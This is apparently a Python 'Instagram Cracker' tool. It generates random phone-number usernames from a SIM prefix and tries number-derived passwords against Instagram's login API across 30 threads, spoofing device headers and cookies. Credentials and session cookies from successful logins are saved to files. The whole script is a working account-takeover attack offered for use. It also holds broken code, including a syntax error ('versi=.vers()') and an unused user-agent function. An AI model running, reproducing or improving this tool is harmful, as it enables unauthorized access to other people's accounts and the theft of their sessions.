#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 2.0
"""

import random
import sys
import time
import hashlib
import uuid
import urllib.request
import requests
import string
import os
import time,subprocess,platform,uuid
import random
import base64
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime 
# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*56}")

def generate_device_hash(uid, pw):
    """Generate device hash for Instagram API"""
    hash_obj = hashlib.md5()
    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
    hex_digest = hash_obj.hexdigest()
    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
    return hash_obj.hexdigest()

def save_success(uid, pw):
    """Thread-safe function to save successful login"""
    try:
        # Try SD card path first
        output_dir = "/sdcard/XYZ"
        fallback_dir = "XYZ"
        
        try:
            os.makedirs(output_dir, exist_ok=True)
            filepath = os.path.join(output_dir, "RANDOM_OK.txt")
        except (OSError, PermissionError):
            # Fallback to local directory
            os.makedirs(fallback_dir, exist_ok=True)
            filepath = os.path.join(fallback_dir, "RANDOM_OK.txt")
        
        with open(filepath, "a", encoding='utf-8') as f:
            f.write(f"{uid}|{pw}\n")
        
        # Thread-safe add to success list
        with success_lock:
            oks.append(uid)
            
    except Exception as e:
        print(f"\r\033[1;91m[Save Error] Failed to save result: {e}")

def crack(uid, password_list, total_count):
    """Enhanced Instagram account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop
        loop += 1
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]                   ")
            sys.stdout.flush()
            
            # Create session and generate device hash    uid   "#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)
            session = requests.Session()
            response = session.get('https://www.instagram.com/accounts/login/')
            csrftoken = response.cookies.get('csrftoken')
            time_now = int(datetime.now().timestamp())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
            cookies = {
            'csrftoken': csrftoken,
            'datr': 'SehHaXwOCk9GiWPH3fNZWglz',
            'ig_did': str(uuid.uuid4()).upper(),
            'mid': 'aUfoSwALAAG_fJ1ItrV9b-sb7DCg',
            'ig_nrcb': '1',
            'wd': '1136x773',}
            headers = {
            'Host': 'i.instagram.com',
            'content-length': '1212',
            'sec-ch-ua': '""Not/A)Brand";v="99", "Samsung Internet";v="23.0", "Chromium";v="115"',
            'x-ig-app-id': '1217981644879628',
            'x-ig-www-claim': 'hmac.AR3mzTXmWJQaei0IjdtQkJIZZIkfif5qOU0tUpKo_5EceiMR',
            'sec-ch-ua-mobile': '?1',
            'x-instagram-ajax': '1010361788',
            'user-agent': 'Mozilla/5.0 (Linux; Android 16; SM-S931U Build/BP2A.250605.031.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 Instagram 408.0.0.51.78 Android (36/16; 540dpi; 1080x2340; samsung; SM-S931U; pa1q; qcom; en_US; 832162577; IABMV/1)',
            'viewport-width': '421',
            'content-type': 'application/x-www-form-urlencoded',
            'accept': '*/*',
            'x-requested-with': 'XMLHttpRequest',
            'x-asbd-id': '129477',
            'x-csrftoken': csrftoken,
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.instagram.com/accounts/login/?force_authentication=1&platform_app_id=532380490911317&next=%2Foauth%2Foidc%2F%3Fredirect_uri%3Dhttps%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Floginpage%2Figoidc%2Fcallback%2Fidtoken%2F%26app_id%3D532380490911317%26response_type%3Dcode%26scope%3Dopenid%26state%3D%257B%2522user_nonce%2522%3A%2522ATA63NIXdVjGuo6UmFDDBPmukpm-ez8r6ccRg00P03dRb3KYqT6N-2VgaI7OvOggwrGpVlMVDp_a3jEpsPryb3gw1Bp0qGkzWAYsf2Cg%2522%2C%2522from_ig_login_upsell_sso%2522%3Anull%2C%2522login_source%2522%3A%2522fbs_web_landing_page%2522%2C%2522next%2522%3A%2522%255Cu00252F%255Cu00253Fnav_ref%255Cu00253Dbizweb_landing_ig_login_button%255Cu002526biz_login_source%255Cu00253Dbizweb_landing_login_ig_oidc_w_pc_login_button%2522%2C%2522require_professional%2522%3Atrue%2C%2522create_business_manager%2522%3Atrue%257D',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
            data = {
            'enc_password': enc_password,
            'caaF2DebugGroup': '0',
            'isPrivacyPortalReq': 'false',
            'loginAttemptSubmissionCount': '0',
            'optIntoOneTap': 'false',
            'queryParams': '{"flo":"true"}',
            'trustedDeviceRecords': '{}',
            'username': uid,
            'jazoest': '22898',}
            # Make API request
            response = session.post('https://i.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
            wanted = ["ds_user_id", "sessionid"]
            all_cookies = session.cookies.get_dict()
            extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
            # Check response
            if 'sessionid' in extracted:
                cookie_str = "; ".join(f"{k}={v}" for k, v in extracted.items())
                print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
                print("Cookies:", cookie_str)
                open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookie_str+"\n")
                oks.append(uid)
                return True
            elif 'challenge_required' in response.text:
                print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
                continue
            elif 'checkpoint_required' in response.text:
                print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
                open("/sdcard/SUMON_INS_CP.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                continue
            else:
                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                continue
                
    except requests.exceptions.Timeout:
        print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException as e:
        print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
        return False
    except KeyboardInterrupt:
        print(f"\r\033[1;93m [Interrupted] User stopped the process")
        raise
    except Exception as e:
        print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
        return False
    
    return False

def ua_ran():
		op = random.choice(['OPPO 1105', 'oppo 15', 'Oppo 3T', 'Oppo 62A', 'oppo6779', 'oppo6833', 'OPPO7273', 'Oppo 9A', 'Oppo A1', 'PHQ110', 'PHQ110', 'PCHM10', 'PCHM10', 'PCHM10', 'PCHM10', 'CPH2071', 'PCHT30', 'PCHM00', 'CPH2083', 'CPH2083', 'CPH2083', 'CPH2185', 'CPH2179', 'CPH2269', 'CPH2421', 'CPH2349', 'CPH2271', 'CPH2477', 'CPH2471', 'CPH2471', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1925', 'oppo A25', 'CPH1837', 'PADT00', 'PADM00', 'CPH1837', 'PADM00', 'OPPO A30', 'OPPO A30', 'OPPO A30', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'OB-OPPO A31c', 'PDVM00', 'PDVM00', 'PDVM00', 'PDVM00', 'CPH2137', 'OPPO A33', 'OPPO A33m', 'OPPO A33t', 'OPPO A34', 'Oppo A34', 'PEFM00', 'PEFM00', 'PEFM00', 'PEFM00', 'PESM10', 'PESM10', 'PESM10', 'PESM10', 'OPPO A36', 'OPPO A37m', 'OPPO A37f', 'A37fw', 'OPPO A37t', 'OPPO A37t', 'OPPO A38', 'CPH1605', 'CPH1605', 'CPH1803', 'OPPO CPH1803', 'OPPO CPH1803', 'OPPO PBBM30', 'CPH1803', 'CPH1853', 'Oppo A4', 'OPPO A40', 'Oppo A400', 'OPPO A41', 'OPPO A42', 'OPPO A43', 'Oppo A43', 'OPPO A44', 'OPPO A45', 'Oppo A45', 'OPPO A46', 'OPPO A47', 'OPPO A48', 'OPPO A49', 'OPPO PBBT30', 'PBAM00', 'CPH1809', 'OPPO PBAT00', 'OPPO PBAM00', 'PBAM00', 'CPH1809', 'CPH1809', 'OPPO PBAM00', 'PBAT00', 'CPH1931', 'CPH1933', 'OPPO A50', 'OPPO A51', 'oppo A51', 'CPH2069', 'CPH2061', 'CPH2061', 'CPH2127', 'CPH2139', 'PECM20', 'PECT30', 'PECM30', 'PECM30', 'OPPO A53m', 'OPPO A53m', 'OPPO A53m', 'CPH2135', 'CPH2321', 'CPH2239', 'CPH2239', 'CPH2195', 'OPG02', 'CPH2273', 'CPH2325', 'PEMT20', 'PEMM20', 'PEMT00', 'PEMM00', 'PEMM00', 'PEMM20', 'PEMM00', 'PEMM20', 'A102OP', 'CPH2309', 'OPPO A56', 'PFVM10', 'PFVM10', 'CPH2407', 'OPPO A57', 'CPH1701', 'OPPO A57', 'CPH1701', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'CPH2387', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'OPPO A59', 'OPPO A59m', 'OPPO A59m', 'OPPO A59s', 'OPPO A59S', 'OPPO A59s', 'OPPO A59st', 'OPPO A59t', 'CPH1909', 'CPH1901', 'OPPO PBFT00', 'OPPO PBFM00', 'CPH1717', 'CPH1801', 'CPH1801', 'Oppo A71A', 'CPH2067', 'PDYM20', 'PDYM10', 'PDYT10', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'CPH2161', 'CPH2099', 'OPPO A73t', 'OPPO A73t', 'OPPO A73t', 'CPH2219', 'OPPO CPH2219', 'CPH2197', 'CPH2263', 'CPH2375', 'CPH1715', 'OPPO A77', 'CPH2339', 'CPH2385', 'CPH2473', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'CPH2483', 'OPPO A79', 'OPPO A79', 'OPPO A79kt', 'OPPO A79', 'OPPO A79k', 'OPPO A79k', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'PCDM00', 'OPPO PCDM00', 'PCDM00', 'PCDM00', 'PCDT00', 'PBBM00', 'PBBM00', 'PBBM00', 'PBBT00', 'PDBM00', 'PDBM00', 'PDBM00', 'PDBM00', 'OPPO A83', 'CPH1729', 'OPPO A83', 'CPH1827', 'CPH1827', 'OPPO A83t', 'OPPO A83t', 'OPPO A83t', 'PCAM10', 'PCAM10', 'PCAM10', 'CPH1938', 'PCAT10', 'PCAM10', 'CPH1938', 'CPH1937', 'CPH1941', 'CPH2001', 'CPH2021', 'PCPM00', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2059', 'PDKT00', 'PDKM00', 'PDKT00', 'PDKT00', 'PDKM00', 'CPH2121', 'PEHM00', 'CPH2123', 'PFGM00', 'PFGM00', 'PFGM00', 'CPH2203', 'CPH2333', 'CPH2365', 'PHA120', 'PHA120', 'OPPO A96', 'PFUM10', 'PFUM10', 'PFUM10', 'PFTM10', 'PFTM10', 'Oppo A98', 'PCEM00', 'PCEM00', 'PCET00', 'CPH1851', 'CPH1920', 'CPH1903', 'A1603', 'OPPOCNM632', 'CPH1114', 'CPH1235', 'CPH1451', 'CPH1615', 'CPH1664', 'CPH1869', 'CPH1869', 'CPH1929', 'CPH1985', 'CPH2048', 'CPH2048', 'CPH2048', 'CPH2107', 'CPH2238', 'CPH2332', 'CPH2351', 'CPH2389', 'CPH2419', 'CPH2451', 'CPH2465', 'CPH2467', 'CPH2529', 'CPH2531', 'CPH2531', 'CPH2589', 'CPH2643', 'CPH3475', 'CPH3669', 'CPH3682', 'CPH3731', 'CPH3776', 'CPH3785', 'CPH4125', 'CPH4275', 'CPH4299', 'CPH4395', 'CPH4473', 'CPH4987', 'CPH5286', 'CPH5841', 'CPH5947', 'CPH6178', 'CPH6244', 'CPH6271', 'CPH6316', 'CPH6519', 'CPH6528', 'CPH6697', 'CPH7338', 'CPH7364', 'CPH7382', 'CPH7532', 'CPH7577', 'CPH7991', 'CPH8153', 'CPH8346', 'CPH8347', 'CPH8363', 'CPH8393', 'CPH8467', 'CPH8472', 'CPH8534', 'CPH8686', 'CPH8893', 'CPH9177', 'CPH9226', 'CPH9659', 'CPH9667', 'CPH9716', 'CPH9763', 'CPH9929', 'oppo f 5 plus', 'OPPO F1 Plus', 'Oppo F1', 'Oppo F1', 'X9009', 'OPPO R9m', 'X9009', 'Oppo F10', 'CPH1911', 'CPH1969', 'Oppo F11Pro', 'CPH2095', 'CPH2119', 'OPPO F19', 'Oppo F19', 'CPH2285', 'CPH2285', 'CPH2213', 'CPH2213', 'CPH2223', 'A1601', 'OPPO F1s', 'OPPO F1s', 'A1601', 'CPH2341', 'CPH2461', 'CPH2455', 'CPH2461', 'CPH2455', 'CPH2527', 'CPH1609', 'CPH1609', 'CPH1609', 'CPH1613', 'CPH1727', 'CPH1723', 'CPH1727', 'CPH1723', 'CPH1723', 'CPH1725', 'CPH1725', 'Oppo F51', 'Oppo F61 Pro', 'CPH1819', 'CPH1821', 'CPH1819 Flow', 'CPH1881', 'CPH1825', 'CPH1825', 'CPH1881', 'CPH1881', 'CPH1825', 'CPH1881', 'CPH1823', 'X909', 'X909', 'R827T', 'R827T', 'R827', 'X9076', 'X9077', 'X9070', 'X9077', 'X9076', 'X9077', 'X9006', 'X9007', 'X9000', 'X9007', 'X9006', 'X9006', 'R815W', 'R815T', 'R815', 'R8111', 'OPPOR8111', 'R821T', 'R821', 'R821', 'PEUM00', 'PEUM00', 'PEUM00', 'PEUM00', 'PGU110', 'PGU110', 'CPH2437', 'PGT110', 'U707T', 'PAFM00', 'CPH1875', 'PAFT00', 'CPH1871', 'PAHM00', 'PAHM00', 'PAHM00', 'PAHM00', 'CPH2023', 'PDEM10', 'CPH2005', 'CPH2025', 'Find X2 Pro', 'PDEM30', 'PEDM00', 'PEDM00', 'Find X3 Neo', 'CPH2173', 'OPG03', 'PEEM00', 'CPH2307', 'PFFM10', 'CPH2305', 'PFEM10', 'OPPOJLAJH6', 'R1011', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCT10', 'CPH2373', 'PGJM10', 'CPH2337', 'PGIM10', 'PGGM10', 'PGGM10', 'CPH1955', 'PCNM00', 'PCNM00', 'PCNM00', 'PCLM50', 'PCLM50', 'PCLM50', 'PERM00', 'PERM00', 'PERM00', 'PEXM00', 'PEXM00', 'PEXM00', 'PEYM00', 'PEYM00', 'PEYM00', 'PERM10', 'PERM10', 'PGCM10', 'PGCM10', 'PGCM10', 'N5117', 'N5117', 'N5117', 'N1T', 'N1T', 'N5209', 'N5207', 'N5207', 'R831T', 'R831T', 'R831', 'Oppo Neo 7', 'R831K', 'R831K', 'R831K', '1201', 'A33w', 'A33f', 'A33fw', 'OPD2102A', 'OPD2101', 'OPPO R10', 'R1001', 'OPPO R11', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11', 'OPPO R11 Plusk', 'OPPO R11 Plus', 'OPPO R11 Plus', 'OPPO R11 Pluskt', 'OPPO R11plus', 'OPPO R11s', 'OPPO R11s', 'OPPO R11st', 'OPPO R11s', 'CPH1719', 'OPPO R11st', 'OPPO R11s', 'OPPO R11s', 'CPH1721', 'OPPO R11s Plus', 'OPPO R11s Plust', 'PAAM00', 'PACM00', 'PACM00', 'PACT00', 'CPH1835', 'PAAM00', 'CPH1831', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBEM00', 'CPH1879', 'PBET00', 'PBEM00', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1877', 'PBDM00', 'PBDT00', 'R8001', 'R8006', 'R8006', 'R8007', 'R8000', 'R8007', 'R8007', 'R8200', 'R8201', 'R8200', 'R8206', 'R2001', 'R2010', 'R2017', 'R2017', 'R8107', 'R8109', 'R8106', 'R8107', 'Oppo R53', 'R6007', 'R7g', 'OPPO R7', 'R7f', 'OPPO R7', 'OPPO R7', 'R7kf', 'R7Plus', 'R7Plusm', 'R7Plus', 'R7Plust', 'R7Plusm', 'R7Plust', 'R7Plusm', 'R7plusf', 'R7005', 'R7007', 'R7007', 'R7sf', 'OPPO R7s', 'OPPO R7sPlus', 'OPPO R7sPlus', 'OPPO R7sm', 'OPPO R7sm', 'oppo r7sm', 'OPPO R7sm', 'OPPO R7sm', 'OPPO R7st', 'OPPO R7t', 'OPPO R7t', 'R801', 'R805', 'OPPOR805', 'R811', 'R819', 'R819T', 'R819T', 'R819T', 'R8205', 'R8207', 'R8207', 'R8207', 'R823T', 'R829', 'R829T', 'R830', 'R830S', 'R833T', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'X9079', 'OPPO R9km', 'OPPO R9km', 'OPPO R9km', 'OPPO R9sk', 'OPPO R9sk', 'CPH1607', 'OPPO R9st', 'CPH1611', 'OPPO R9s Plus', 'OPPO R9t', 'OPPO R9t', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'CPH1917', 'PCAM00', 'PCAM00', 'PCAM00', 'PCAT00', 'PCCT00', 'PCCT00', 'CPH1919', 'PCCM00', 'CPH1907', 'CPH1907', 'CPH1907', 'CPH1907', 'PCKM00', 'CPH1907', 'CPH1989', 'CPH1989', 'CPH1951', 'CPH1945', 'CPH1945', 'CPH2043', 'CPH2043', 'PDCM00', 'A001OP', 'PDCM00', 'PDCM00', 'PCRT01', 'PCRT01', 'CPH2009', 'CPH2035', 'CPH2037', 'CPH2013', 'A002OP', 'CPH2113', 'CPH2091', 'PDPM00', 'PDPT00', 'CPH2125', 'CPH2109', 'CPH2109', 'PDNM00', 'CPH2089', 'PDNM00', 'PDNT00', 'PEAT00', 'PEAM00', 'PEAM00', 'CPH2209', 'CPH2065', 'CPH2159', 'CPH2159', 'CPH2145', 'PEGM00', 'CPH2205', 'CPH2207', 'PDSM00', 'CPH2201', 'PDST00', 'PDSM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'CPH2199', 'A101OP', 'A103OP', 'CPH2217', 'CPH1921', 'PEGM10', 'PEGT10', 'PEGT10', 'PEGM10', 'PEGT10', 'CPH2211', 'CPH2235', 'CPH2251', 'PEQM00', 'PEPM00', 'PEPM00', 'CPH2247', 'CPH2249', 'PENM00', 'PENM00', 'PENM00', 'PENM00', 'CPH2237', 'CPH2237', 'CPH2371', 'CPH2363', 'CPH2293', 'PFDM00', 'PFCM00', 'PFCM00', 'PFCM00', 'A201OP', 'CPH2353', 'OPG04', 'CPH2343', 'PGBM10', 'PGBM10', 'PGBM10', 'CPH2357', 'CPH2359', 'PFZM10', 'CPH2457', 'CPH2481', 'CPH2505', 'PHM110', 'PHM110', 'PHM110', 'PHM110', 'PGX110', 'PGX110', 'PGX110', 'PGW110', 'PGW110', 'PGW110', 'CPH1983', 'CPH1983', 'PCLM10', 'PCLM10', 'PCLM10', 'PCLM10', 'PDHM00', 'arm_64 PDHM00', 'PDHM00', 'PCGM00', 'PCGM00', 'PCGM00', 'PCGM00', 'CPH1979', 'PCDM10', 'CPH1979', 'Oppo Reno2 /MMB29M', 'OPPO Reno5 Pro Plus', 'Oppo S1', 'Oppo S17', 'Oppo S4', 'OPPOT29', 'U705T', 'U705T', 'Oppo V5', 'OW20W1', 'OW19W2', 'OW19W3', 'OW19W1', 'oppo x', 'Oppo X', 'OPPO x20 70816.012', 'OPPO x22 6.012', 'OPPOX9017', 'OPPOX907', 'OPPOX907', 'Oppo Y15', 'Oppo Y21', 'Oppo Y3', 'Oppo Z1'])
		rr = random.randint;rc = random.choice;dpis = random.choice(["240dpi", "480dpi", "320dpi", "440dpi", "640dpi","133dpi","320dpi","515dpi","160dpi","640dpi","240dpi","120dpi","800dpi","480dpi","225dpi","768dpi","216dpi","1024dpi","213dpi","450dpi"]);basa =rc(['en_US','en_GB','id_ID','in_ID','de_DE','ru_RU','en_SG','fr_FR','fa_IR','ja_JP','pt_BR','cs_CZ','zh_HK','zh_CN','vi_VN','en_PH','en_IN','tr_TR','it_IT']);pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688","1080x1920","720x1280","1080x2076","1440x2768","1440x2368"]);akhir = rr(399993134,444761830);com=rc(["qcom","mt6833","mt6765","mt8168"]);ver = rr(18,25);si = rr(72,120);versi=.vers();andro=rc([f"30/{rr(4,23)}",f"31/{rr(4,13)}",f"29/{rr(4,13)}"]);xiaomi=rc(['M2004J19C','Redmi Note 9S','M2101K7AG','cepheus','Redmi Note 9 Pro','Redmi Note 8 Pro','220333QL','M2101K7BG','M2006C3MG','M2012K11G'])
		mod=rc(['galahad','curtana','sunny','cepheus','joyeuse','begonia','wind','secret','angelica','raphael','vili','taoyao','ginkgo','renoir','haydn'])
		ofo = f"InstagramCarbon {versi} Android ({andro}; {dpis}; {pxl}; OPPO; {op}; {op}; {com}; {basa}; {akhir})"
		return ofo
def vers():
		igv=("100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,79.0.0.21.101,78.0.0.11.104,77.0.0.20.113,76.0.0.15.395,75.0.0.23.99,74.0.0.21.99,73.0.0.22.185,72.0.0.21.98,71.0.0.18.102,70.0.0.22.98,69.0.0.30.95,68.0.0.11.99,67.0.0.25.100,66.0.0.11.101,65.0.0.12.86,64.0.0.14.96,63.0.0.17.94,62.0.0.19.93,61.0.0.19.86,60.1.0.17.79,59.0.0.23.76,58.0.0.12.73,57.0.0.9.80,56.0.0.13.78,55.0.0.12.79,54.0.0.14.82,53.0.0.13.84,52.0.0.8.83,51.0.0.20.85,50.1.0.43.119,49.0.0.15.89,48.0.0.15.98,47.0.0.16.96,46.0.0.15.96,45.0.0.17.93,44.0.0.9.93,43.0.0.10.97,42.0.0.19.95,41.0.0.13.92,40.0.0.14.95,39.0.0.19.93,38.0.0.13.95,37.0.0.21.97,36.0.0.13.91,35.0.0.20.96,34.0.0.12.93,33.0.0.11.92,32.0.0.16.94,31.0.0.10.94,30.0.0.12.95,271.1.0.21.84,131.0.0.23.11,130.0.0.31.12,128.0.0.26.12,126.0.0.25.12,125.0.0.20.12,124.0.0.17.47,123.0.0.21.11,122.0.0.29.23,120.0.0.29.11,119.0.0.33.14,118.0.0.28.12,117.0.0.28.12,115.0.0.26.11,114.0.0.38.12,113.0.0.39.12,112.0.0.29.12,111.1.0.25.15,110.0.0.16.11,109.0.0.18.12,108.0.0.23.11,107.0.0.27.12,106.0.0.24.11,105.0.0.18.11,104.0.0.21.11,103.1.0.15.11,102.0.0.20.11,101.0.0.15.12,100.0.0.17.12,99.0.0.32.182,98.0.0.15.119,97.0.0.32.119")
		igve=igv.split(",")
		versi=random.choice(igve)
		return versi


def generate_random_ids(limit):
    """Generate random 6-digit IDs"""
    idz.clear()
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    return [
        uid[:6],     # First 6 digits
        uid[:8],     # First 8 digits
        uid,         # Full number
        '57273200',  # Static common password
    ]

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🎯 INSTAGRAM RANDOM NUMBER CLONING 🎯")
    print(f"\033[1;96m{'='*56}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    # get user limit
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
        limit = 99999
        time.sleep(2)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🔥 STARTING INSTAGRAM CLONING 🔥")
    print(f"\033[1;96m{'='*56}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mXYZ/RANDOM_OK.txt')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                print(f"\n\033[1;91m[!] Task failed: {e}")
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[😞] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*56}")
        print(f"\033[1;96m     🚀 INSTAGRAM CRACKER v2.0 - ENHANCED 🚀")
        print(f"\033[1;96m{'='*56}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*60}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            clear()
            print(f"\033[1;96m{'='*56}")
            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
            print(f"\033[1;96m{'='*56}")
            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '3':
            clear()
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;93m[!] Results saved in: XYZ/RANDOM_OK.txt")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
